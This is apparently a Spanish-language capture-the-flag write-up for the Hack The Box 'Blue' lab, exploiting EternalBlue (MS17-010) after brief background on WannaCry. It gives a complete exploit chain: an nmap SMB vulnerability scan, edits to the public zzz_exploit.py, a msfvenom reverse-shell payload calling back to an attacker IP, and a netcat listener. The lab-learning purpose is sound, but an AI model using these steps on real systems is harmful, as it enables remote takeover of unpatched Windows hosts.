#CVE-2017-0143 #nmapscripts

Se lo conoce como EternalBlue, MS17-010 o si no CVE-2017-0143
WannaCry fue un ransomware que se propagó en mayo de 2017 aprovechando la vulnerabilidad MS17-010 (EternalBlue). Infectaba computadoras con Windows y cifraba los archivos, exigiendo un rescate en Bitcoin. Se expandió rápidamente como un gusano, afectando miles de organizaciones en todo el mundo. Fue detenido parcialmente gracias al descubrimiento de un kill switch por un investigador.
Un **kill switch** (interruptor de apagado) es un mecanismo oculto en un malware que permite **detener su funcionamiento** si se cumple cierta condición. En el caso de WannaCry, era un dominio web que, si estaba registrado y respondía, hacía que el malware se detuviera. Un investigador lo descubrió por accidente, registró ese dominio, y sin querer **frenó la propagación global** del ransomware.

-----------
# Enumeracion

Vamos a ejecutar los [[NMAP Scripts]] que analizan vulnerabilidades sobre [[smb]]
```
nmap --script "smb-vuln*" -p445 10.10.10.40 -oN smbScan
```

![[Blue9.png]]
Como podemos ver, es vulnerable

--------
# Explotacion

Con [[git clone]] vamos a descargar el repositorio `git clone https://github.com/worawit/MS17-010`
Usando [[cd]] con el comando `cd MS17-010` entramos a carpeta del repositorio, listamos el contenido con [[ls]]
Y de todos estos archivos, vamos a usar solamente el *checker.py* y *zzz_exploit.py*

![[Blue10.png]]
Usando [[nvim]] abrimos el archivo *checker.py* usando el comando `nvim checker.py`

Vamos a poner de usuario *guest* que es lo que vimos vulnerable en uno de los escaneos de NMAP
![[Blue5.png]]

Y ahora con `python2-7 checker.py 10.10.10.40` Vemos que podemos usar los pipes 
![[Blue6.png]]
El pipe que nos interesa es el *lsarpc* por que es el mas completo, ya que nos deja ver usuarios, grupos, permisos ,etc


### Ya tenemos el canal de comunicacion elegido, que seria el pipe. Ahora vamos a hacer el archivo malioso que vamos a inyectar con [[msfvenom]]

```
msfvenom -p windows/shell_reverse_tcp lhost=10.10.16.5 lport=443 -f exe -o exploit.exe --platform windows
```

![[Blue11.png]]
Tenemos creado el archivo exploit.exe para inyectar y que nos envie la [[Reverse shell]]

### Tenemos que modificar el archivo *zzz_exploit.py*
Lo abrimos nuevamente con [[nvim]] usando el comando `nvim zzz_exploit.py`
![[Blue13.png]]
En username van a poner *guest* como hicimos anteriormente.

Y ahora van a ir a la siguiente linea, pueden buscar la funcion *smb_pwn* para encontrarla

Lo vamos a poner de la siguiente manera, como esta en la foto, tengan encuenta que les puede saltar un error por los espacios y tabulacion, asi que recomiendo que sigan mi formato. Y solamente cambien la ruta donde tienen el archivo y en todo caso el nombre del mismo
![[Blue14.png]]

```python
def smb_pwn(conn, arch):
    smbConn = conn.get_smbconnection()

    #print('creating file c:\\pwned.txt on the target')
    #tid2 = smbConn.connectTree('C$')
    #fid2 = smbConn.createFile(tid2, '/pwned.txt')
    #smbConn.closeFile(tid2, fid2)
    #smbConn.disconnectTree(tid2)
    smb_send_file(smbConn, '/home/bunzo/Desktop/Blue/content/MS17-010/exploit.exe', 'C', '/exploit.exe')
    service_exec(conn, r'cmd /c c:\\exploit.exe')
    #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
    #service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
    # Note: there are many methods to get shell over SMB admin session
    # a simple method to get shell (but easily to be detected by AV) is
    # executing binary generated by "msfvenom -f exe-service ..."
```


 Ahora solo nos falta ponernos en escucha con [[nc -nlvp 443]] y ejecutar el exploit con `python2.7 zzz_exploit.py 10.10.10.40 lsarpc`

![[Blue15.png]]

![[Blue12.png]]
